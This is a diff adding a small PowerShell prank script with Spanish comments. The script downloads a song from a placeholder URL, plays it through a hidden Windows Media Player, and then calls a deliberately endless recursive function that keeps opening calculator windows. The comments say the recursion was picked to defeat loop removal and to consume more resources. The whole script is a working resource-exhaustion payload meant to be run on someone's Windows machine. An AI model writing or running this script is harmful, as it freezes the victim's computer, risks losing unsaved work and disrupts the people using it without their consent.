@@ -1,0 +1,27 @@
+# Resumen: Este script de PowerShell descarga Running in the 90's, la abre con Windows Media Player y abre infinitas calculadoras
+# En Windows 7, funciona perfectamente
+# En Windows 10, solo abre calculadoras infinitas
+
+$PSPath = $pwd; # Nos guardamos el directorio de trabajo
+$url = "PON AQUÍ LA URL DE RUNNING IN THE 90'S"; # Preparamos la URL con Running in the 90's
+$output = "$PSPath\hacks.mp3"; # La descargamos en el directorio de trabajo como Hacks.mp3
+
+$downloader = New-Object System.Net.WebClient; # Creamos un cliente de descarga
+$downloader.DownloadFile($url, $output); # Descargamos la canción
+
+$downloader.Dispose(); # Soltamos recursos (equivalente a "delete downloader" en C++)
+$audiofile = [uri] "$PSPath\hacks.mp3"; # Pasamos la canción a una URI (esto en Windows 10 no funciona)
+$PLAYER=NEW-OBJECT -ComObject 'Mediaplayer.Mediaplayer'; # Creamos un Windows Media Player oculto
+$PLAYER.Filename=$audiofile; # Le ponemos como archivo la URI
+$PLAYER.Play();
+Start-Sleep 24; # Sincronizamos con el drop
+
+function Kansei # Función infinitamente recursiva que abre calculadoras
+{
+
+	Invoke-Item C:\windows\system32\calc.exe; # PowerShell eliminaba todos los bucles infinitos, salvo éste
+	Kansei; # Al ser recursiva, gastamos aún más recursos
+
+}
+
+Kansei; # Bucle infinito
